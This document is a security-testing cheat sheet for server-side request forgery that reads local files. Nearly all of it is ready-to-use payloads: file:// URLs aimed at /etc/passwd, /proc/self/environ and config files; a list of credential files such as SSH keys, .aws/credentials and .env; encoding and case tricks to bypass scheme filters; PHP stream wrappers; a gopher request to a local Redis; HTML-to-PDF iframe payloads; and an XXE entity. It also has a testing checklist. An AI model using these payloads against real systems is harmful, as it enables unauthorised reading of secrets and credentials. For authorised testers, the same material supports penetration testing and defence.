# SSRF - File Read via file:// and Local Protocols

## file:// Protocol
```
http://target.com/fetch?url=file:///etc/passwd
http://target.com/fetch?url=file:///c:/windows/system32/drivers/etc/hosts
http://target.com/fetch?url=file:///proc/self/environ
http://target.com/fetch?url=file:///var/www/html/config.php
```

## Common Sensitive Files
```
Linux:
/etc/passwd
/etc/shadow (needs root)
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/proc/net/tcp
/home/user/.ssh/id_rsa
/var/log/auth.log
/app/.env
/app/config.php

Windows:
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Windows\win.ini
```

## Application-Specific Config Files
```
.env
config.php / config.yml / settings.py
web.config
application.properties
docker-compose.yml
.git/config
.aws/credentials
```

## Bypass secure_file_priv / Restricted Protocols

### If http:// blocked but not file://
```
url=file:///etc/passwd
```

### If scheme validation weak
```
url=FILE:///etc/passwd           # Case variation
url=file:/etc/passwd             # Fewer slashes (some parsers accept)
url=File%3A%2F%2F%2Fetc%2Fpasswd  # URL encoded
```

## PHP Wrappers (if PHP-based fetch)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
phar://path/to/file.phar/internal.file
zip://path/to/file.zip#internal_file
```

## Gopher for Complex Requests (combines with file read pivot)
```
gopher://127.0.0.1:6379/_SET%20key%20value
```

## PDF/Document Generator SSRF (common vector)
```html
<!-- If app converts HTML to PDF (wkhtmltopdf, etc) -->
<iframe src="file:///etc/passwd"></iframe>
<img src="file:///etc/passwd">
<object data="file:///etc/passwd"></object>
```

## XXE-Based File Read (related vector)
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

## Testing Checklist
```
1. Identify the fetch/import/convert functionality accepting URL
2. Test file:// with known-readable file (/etc/passwd, win.ini)
3. Try wrapping in different schemes if blocked
4. Check for XXE if XML-based (SVG, DOCX, PDF converters)
5. Check for local file inclusion via template engines
```
